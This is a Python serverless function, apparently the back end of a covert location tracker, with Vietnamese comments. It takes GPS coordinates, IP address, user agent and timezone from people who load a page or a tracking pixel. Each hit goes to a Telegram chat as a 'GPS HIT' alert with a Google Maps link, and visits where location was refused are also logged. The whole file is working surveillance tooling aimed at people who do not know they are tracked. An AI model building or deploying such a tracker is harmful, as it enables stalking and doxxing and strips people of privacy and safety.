# language: Python 3, file: api/collect.py
# Vercel serverless function — nhận GPS data, alert Telegram
# không cần requirements.txt — chỉ dùng stdlib

from http.server import BaseHTTPRequestHandler
import json, os, urllib.parse, urllib.request
from datetime import datetime

# lấy từ Vercel Environment Variables
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT  = os.environ.get("TELEGRAM_CHAT", "")

GIF_1x1 = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff"
    b"\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,"
    b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
)

def send_telegram(data: dict):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT:
        return

    t   = data.get("type", "unknown")
    lat = data.get("lat", "")
    lon = data.get("lon", "")
    acc = data.get("accuracy", "?")
    ip  = data.get("ip", "?")
    ua  = str(data.get("ua", ""))[:120]
    ts  = data.get("ts", "")
    tz  = data.get("tz", "")

    if lat and lon:
        maps = f"https://maps.google.com/?q={lat},{lon}"
        msg = (
            f"🎯 *GPS HIT* — `{t}`\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📍 Tọa độ: `{lat}, {lon}`\n"
            f"🎯 Sai số: `{acc} mét`\n"
            f"🗺 [Mở Google Maps]({maps})\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🌐 IP: `{ip}`\n"
            f"🌍 Timezone: `{tz}`\n"
            f"🕐 `{ts}`\n"
            f"📱 `{ua}`"
        )
    elif t == "pageload":
        msg = (
            f"👁 *PAGE LOAD*\n"
            f"🌐 IP: `{ip}`\n"
            f"🌍 Timezone: `{tz}`\n"
            f"🕐 `{ts}`\n"
            f"📱 `{ua}`"
        )
    elif t == "geo_error":
        msg = (
            f"🚫 *LOCATION DENIED*\n"
            f"🌐 IP: `{ip}`\n"
            f"❌ Lý do: `{data.get('msg', '')}`\n"
            f"🕐 `{ts}`"
        )
    else:
        msg = f"📡 *{t.upper()}*\nIP: `{ip}`\n`{ts}`"

    payload = json.dumps({
        "chat_id":                  TELEGRAM_CHAT,
        "text":                     msg,
        "parse_mode":               "Markdown",
        "disable_web_page_preview": True
    }).encode("utf-8")

    try:
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data    = payload,
            headers = {"Content-Type": "application/json"},
            method  = "POST"
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass  # telegram fail không làm crash function


class handler(BaseHTTPRequestHandler):

    def log_message(self, *args):
        pass  # tắt default log của BaseHTTPRequestHandler

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def _gif_response(self):
        self.send_response(200)
        self.send_header("Content-Type",   "image/gif")
        self.send_header("Cache-Control",  "no-store, no-cache")
        self._cors()
        self.end_headers()
        self.wfile.write(GIF_1x1)

    def _get_ip(self):
        raw = (self.headers.get("X-Forwarded-For")
               or self.headers.get("X-Real-IP")
               or self.client_address[0])
        return raw.split(",")[0].strip()

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params["ip"] = self._get_ip()
        params["ua"] = self.headers.get("User-Agent", "")
        params["ts"] = datetime.utcnow().isoformat()
        if "type" not in params:
            params["type"] = "pixel"
        send_telegram(params)
        self._gif_response()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length) if length else b"{}"
        try:
            data = json.loads(body.decode("utf-8"))
        except Exception:
            data = {}
        data["ip"] = self._get_ip()
        data["ua"] = self.headers.get("User-Agent", "")
        data["ts"] = datetime.utcnow().isoformat()
        if "type" not in data:
            data["type"] = "post"
        send_telegram(data)
        self._gif_response()